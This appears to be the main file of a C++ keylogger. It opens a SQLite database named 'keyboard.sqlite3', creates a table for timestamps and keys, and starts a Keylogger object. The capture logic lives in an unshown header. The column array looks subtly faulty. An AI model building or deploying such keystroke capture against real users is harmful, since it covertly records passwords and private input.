#include "keylogger.h"

#include <ctime>
#include <iostream>

int main(int argc, char** argv) {
	
	Database db("keyboard.sqlite3");
	std::string cols[2] = { "time, key" };
	db.createTable("keyboard", 2, cols);

	Keylogger keylogger;
	keylogger.start(db);

	return 0;
}